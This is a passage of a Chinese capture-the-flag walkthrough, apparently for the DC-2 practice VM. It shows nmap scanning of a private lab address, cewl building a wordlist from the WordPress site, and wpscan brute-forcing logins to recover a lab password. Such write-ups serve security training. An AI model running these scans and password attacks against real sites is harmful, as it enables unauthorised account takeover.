## 0X02 信息收集

1.ip收集

信息收集第一步肯定是先找ip，由于知道自己虚拟机网段是192.168.23.xxx

所以利用nmap工具进行扫描

命令

```
nmap -sP 192.168.23.0/24
```

![](../Images/43eb413d95dfc3ba064a0e97796f168d.png)

```
192.168.23.173
```

2.端口信息收集

```
nmap --script=vuln 192.168.23.173
```

![](../Images/a1a87c236ceddcc3334b8c3f753f9141.png)

开启的80端口,且cms貌似是wordpress 不排除误报

尝试访问

```
http://192.168.23.173:80
```

![](../Images/793b63fe25e41f1a3aa9bd66776d3a03.png)

抓取网络数据包，发现做了重定向，跳转的目标是dc-2

![](../Images/c7acb319664bc8c9d3f0105529b14d6a.png)

  

3.修改本地host文件

在本地host文件中添加ip 写死指定目标为 dc-2

```
192.168.23.173  dc-2
```

![](../Images/b386bbb78718c194a4697051807998ef.png)

可以看到确实是wordpress，而且存在一个flag

4.flag1

大概意思就是让我登录才能看到下一个flag

刚刚nmap扫出来的就有用了

![](../Images/60690aa3e072d56cbfdcc679ffe72d15.png)

有路径，有用户

尝试访问

```
http://192.168.23.173/wp-login.php
```

![](../Images/0b94e0eec262e12e0740f69ede8f161a.png)

此时用到wspcan 可以爆破用户的密码

刚刚网页上有cewl 拿去百度，是一个可以将网站的密码生成一个字典

![](../Images/be3b91e366e25a90df8e6bd7f2f5b516.png)

```

cewl http://dc-2 -w dict.txt            生成字典
```

![](../Images/3408dbf6a8b1190d7277be90e72756ea.png)

再利用wpscan

![](../Images/13c98e2559f753a2646bb70adf99932a.png)![](../Images/0cec2a8d12bf69a943c952f529f6cf34.png)

  

新建一个txt文档将三个用户写入

![](../Images/9bfdb947c73f4afcb44160177a17b153.png)

```
wpscan --url http://dc-2    -P dict.txt     -U user.txt
```

![](../Images/73c1e25fc95656ab996fa2231673b72f.png)

```

| Username: jerry, Password: adipiscing
```
